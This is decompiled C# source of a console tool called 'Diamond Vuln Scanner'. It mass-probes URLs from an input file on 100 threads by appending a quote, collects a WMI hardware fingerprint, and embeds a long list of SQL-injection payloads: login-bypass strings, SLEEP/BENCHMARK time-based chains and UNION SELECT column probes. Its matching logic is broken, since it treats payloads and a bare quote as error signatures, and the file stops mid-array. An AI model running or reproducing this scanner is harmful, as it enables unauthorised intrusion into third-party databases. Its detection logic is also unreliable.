using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using xNet;

internal class Class0
{
	private static string smethod_0(string string_2)
	{
		HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(string_2);
		return Class0.smethod_1(hashAlgorithm.ComputeHash(bytes));
	}
	private static string smethod_1(IList<byte> ilist_0)
	{
		string text = string.Empty;
		for (int i = 0; i < ilist_0.Count; i++)
		{
			byte b = ilist_0[i];
			int num = (int)(b & 15);
			int num2 = b >> 4 & 15;
			if (num2 > 9)
			{
				text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
			}
			else
			{
				text += num2.ToString(CultureInfo.InvariantCulture);
			}
			if (num > 9)
			{
				text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
			}
			else
			{
				text += num.ToString(CultureInfo.InvariantCulture);
			}
			if (i + 1 != ilist_0.Count && (i + 1) % 2 == 0)
			{
				text += "-";
			}
		}
		return text;
	}

	private static string smethod_2()
	{
		if (string.IsNullOrEmpty(Class0.string_0))
		{
			Class0.string_0 = Class0.smethod_0(string.Concat(new string[]
			{
				"CPU >> ",
				Class0.smethod_5(),
				"\nBIOS >> ",
				Class0.smethod_6(),
				"\nBASE >> ",
				Class0.smethod_8(),
				"\nDISK >> ",
				Class0.smethod_7(),
				"\nVIDEO >> ",
				Class0.smethod_9(),
				"\nMAC >> ",
				Class0.smethod_10()
			}));
		}
		return Class0.string_0;
	}

	private static string smethod_3(string string_2, string string_3, string string_4)
	{
		string text = "";
		foreach (ManagementBaseObject managementBaseObject in new ManagementClass(string_2).GetInstances())
		{
			if (!(managementBaseObject[string_4].ToString() != "True") && !(text != ""))
			{
				try
				{
					text = managementBaseObject[string_3].ToString();
					break;
				}
				catch
				{
				}
			}
		}
		return text;
	}

	private static string smethod_4(string string_2, string string_3)
	{
		string text = "";
		foreach (ManagementBaseObject managementBaseObject in new ManagementClass(string_2).GetInstances())
		{
			if (!(text != ""))
			{
				try
				{
					text = managementBaseObject[string_3].ToString();
					break;
				}
				catch
				{
				}
			}
		}
		return text;
	}

	private static string smethod_5()
	{
		string text = Class0.smethod_4("Win32_Processor", "UniqueId");
		string result;
		if (text != "")
		{
			result = text;
		}
		else
		{
			text = Class0.smethod_4("Win32_Processor", "ProcessorId");
			if (text != "")
			{
				result = text;
			}
			else
			{
				text = Class0.smethod_4("Win32_Processor", "Name");
				if (text == "")
				{
					text = Class0.smethod_4("Win32_Processor", "Manufacturer");
				}
				text += Class0.smethod_4("Win32_Processor", "MaxClockSpeed");
				result = text;
			}
		}
		return result;
	}

	private static string smethod_6()
	{
		return string.Concat(new string[]
		{
			Class0.smethod_4("Win32_BIOS", "Manufacturer"),
			Class0.smethod_4("Win32_BIOS", "SMBIOSBIOSVersion"),
			Class0.smethod_4("Win32_BIOS", "IdentificationCode"),
			Class0.smethod_4("Win32_BIOS", "SerialNumber"),
			Class0.smethod_4("Win32_BIOS", "ReleaseDate"),
			Class0.smethod_4("Win32_BIOS", "Version")
		});
	}

	private static string smethod_7()
	{
		return Class0.smethod_4("Win32_DiskDrive", "Model") + Class0.smethod_4("Win32_DiskDrive", "Manufacturer") + Class0.smethod_4("Win32_DiskDrive", "Signature") + Class0.smethod_4("Win32_DiskDrive", "TotalHeads");
	}

	private static string smethod_8()
	{
		return Class0.smethod_4("Win32_BaseBoard", "Model") + Class0.smethod_4("Win32_BaseBoard", "Manufacturer") + Class0.smethod_4("Win32_BaseBoard", "Name") + Class0.smethod_4("Win32_BaseBoard", "SerialNumber");
	}

	private static string smethod_9()
	{
		return Class0.smethod_4("Win32_VideoController", "DriverVersion") + Class0.smethod_4("Win32_VideoController", "Name");
	}

	private static string smethod_10()
	{
		return Class0.smethod_3("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled");
	}

	private static void Main(string[] args)
	{
		try
		{
			ServicePointManager.DefaultConnectionLimit = 20;
			Console.Title = "Diamond Vuln Scanner";
			Console.WriteLine("Make Sure there are urls in Input.txt then click enter to start");
			Console.ReadLine();
			Class0.smethod_2();
			Class0.Class1 @class = new Class0.Class1();
			Class0.list_0.AddRange(File.ReadLines(Environment.CurrentDirectory + "/Input.txt"));
			Class0.int_0 = Class0.list_0.Count;
			@class.int_0 = 1;
			do
			{
				ParameterizedThreadStart start;
				if ((start = @class.parameterizedThreadStart_0) == null)
				{
					start = (@class.parameterizedThreadStart_0 = new ParameterizedThreadStart(@class.method_0));
				}
				new Thread(start).Start(@class.int_0);
				int num = @class.int_0;
				@class.int_0 = checked(num + 1);
			}
			while (@class.int_0 <= 100);
		}
		catch
		{
			Console.WriteLine("An Error Has Occured :(");
		}
	}

	public static void smethod_11(int int_3)
	{
		while (int_3 < Class0.list_0.Count - 1)
		{
			Class0.int_1++;
			try
			{
				string text = Class0.list_0[int_3].ToString();
				Class0.list_0.RemoveAt(int_3);
				if (text.Contains("?") && text.Contains("="))
				{
					Class0.smethod_12(text);
				}
			}
			catch
			{
			}
			Console.Title = string.Concat(new object[]
			{
				"Diamond Vuln Scanner - ",
				Convert.ToString(Class0.int_1),
				"/",
				Class0.int_0,
				" | Vulnerables: ",
				Class0.scanned,
			});
		}
		Class0.int_2++;
		if (Class0.int_2 >= 100)
		{
			Console.Title = "Diamond Vuln Scanner";
			Console.WriteLine("Finished! Click enter to close");
			Console.ReadKey();
		}
	}

	public static bool smethod_12(string string_2)
	{
		try
		{
			using (HttpRequest httpRequest = new HttpRequest())
			{
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0";
				httpRequest.Cookies = new CookieDictionary(false);
				httpRequest.ConnectTimeout = 10000;
				httpRequest.ReadWriteTimeout = 10000;
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				string @object = httpRequest.Get(string_2 + "'", null).ToString();
				if (Class0.string_1.Any(new Func<string, bool>(@object.Contains)))
				{
					Class0.scanned++;
					Class0.list_1.Add(string_2);
					File.WriteAllLines(Environment.CurrentDirectory + "/Output.txt", Class0.list_1);
				}
			}
		}
		catch
		{
		}
		return true;
	}

	private static List<string> list_0 = new List<string>();

	public static List<string> list_1 = new List<string>();

	private static int int_0;

	private static int int_1;

	private static string string_0 = string.Empty;

	private static int int_2;

	private static string[] string_1 = new string[]
	{
		"'-'",
		"' '",
		"'&'",
		"'^'",
		"'*'",
		"' or ''-'",
		"' or '' '",
		"' or ''&'",
		"' or ''^'",
		"' or ''*'",
		"or true--",
		"' or true--",
		"') or true--",
		"' or 'x'='x",
		"') or ('x')=('x",
		"')) or (('x'))=(('x",
		"or 1=1",
		"or 1=1--",
		"or 1=1/*",
		"admin' --",
		"admin'/*",
		"admin' or '1'='1",
		"admin' or '1'='1'--",
		"admin' or '1'='1'/*",
		"admin'or 1=1 or ''='",
		"admin' or 1=1",
		"admin' or 1=1--",
		"admin' or 1=1/*",
		"admin') or ('1'='1",
		"admin') or ('1'='1'--",
		"admin') or ('1'='1'/*",
		"admin') or '1'='1",
		"admin') or '1'='1'--",
		"admin') or '1'='1'/*",
		"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
		"sql syntax mysql",
		"warning: mysql_",
		"mysql query fail",
		"sql syntax mariadb server",
		"you have an error in your",
		"mysql_num_rows()",
		"mysql_fetch_array()",
		"mysql_result()",
		"mysql_query()",
		"mysql_fetch_assoc()",
		"mysql_numrows()",
		"mysql_fetch_row()",
		"mysql_fetch_object()",
		"jdbc mysql()",
		"mysql driver",
		"mysql error",
		"mysql odbc",
		"on mysql result index",
		"supplied argument is not a valid mysql result resource",
		"mysql server version for the right syntax to use near",
		"<b>Warning</b>:",
		".php on line",
		"postgresql error",
		"warning \\wpg_",
		"warning: postgresql",
		"ole db sql server",
		"(\\w|\\a)sql server driver",
		"warning: odbc_",
		"warning: mssql_",
		"msg \\d+, level \\d+, state \\d+",
		"unclosed quotation mark after the character string",
		"microsoft ole db provider for odbc drivers",
		"microsoft ole db provider for odbc drivers error",
		"[microsoft][odbc sql server driver][sql server]",
		"odbc drivers error '80040e14'",
		"odbc sql server driver",
		"jdbc sql",
		"microsoft ole db provider for sql server",
		"unclosed quotation mark",
		"vbscript runtime",
		"sqlserver jdbc driver",
		"microsoft access driver",
		"access database engine",
		"microsoft jet database engine",
		"syntax error in query expression",
		"\\bora-[0-9][0-9][0-9][0-9]",
		"oracle error",
		"warning: oci_",
		"microsoft ole db provider for oracle",
		"cli driver db2",
		"db2 sql error",
		"sqlite/jdbcdriver",
		"system.data.sqlite.sqliteexception",
		"warning: ibase_",
		"com.informix.jdbc",
		"warning: sybase",
		"sybase message",
		"'",
		"')",
		"';",
		"\"",
		"\")",
		"\";",
		"`",
		"`)",
		"`;",
		"\\",
		"%27",
		"%%2727",
		"%25%27",
		"%60",
		"%5C",
		"[t]",
		"' and 1=[t] and '1'='1",
		"ORDER BY SLEEP(5)",
"ORDER BY 1,SLEEP(5)",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"ORDER BY SLEEP(5)#",
"ORDER BY 1,SLEEP(5)#",
"ORDER BY 1,SLEEP(5),3#",
"ORDER BY 1,SLEEP(5),3,4#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
"ORDER BY SLEEP(5)-- ",
"ORDER BY 1,SLEEP(5)-- ",
"ORDER BY 1,SLEEP(5),3-- ",
"ORDER BY 1,SLEEP(5),3,4-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",
"UNION ALL SELECT 1",
"UNION ALL SELECT 1,2",
"UNION ALL SELECT 1,2,3",
"UNION ALL SELECT 1,2,3,4",
"UNION ALL SELECT 1,2,3,4,5",
"UNION ALL SELECT 1,2,3,4,5,6",
"UNION ALL SELECT 1,2,3,4,5,6,7",
"UNION ALL SELECT 1,2,3,4,5,6,7,8",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"UNION ALL SELECT 1#",
"UNION ALL SELECT 1,2#",
"UNION ALL SELECT 1,2,3#",
"UNION ALL SELECT 1,2,3,4#",
"UNION ALL SELECT 1,2,3,4,5#",
"UNION ALL SELECT 1,2,3,4,5,6#",
"UNION ALL SELECT 1,2,3,4,5,6,7#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
"UNION ALL SELECT 1-- ",
"UNION ALL SELECT 1,2-- ",
"UNION ALL SELECT 1,2,3-- ",
"UNION ALL SELECT 1,2,3,4-- ",
"UNION ALL SELECT 1,2,3,4,5-- ",
"UNION ALL SELECT 1,2,3,4,5,6-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",
"UNION SELECT @@VERSION,SLEEP(5),3",
"UNION SELECT @@VERSION,SLEEP(5),USER(),4",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",
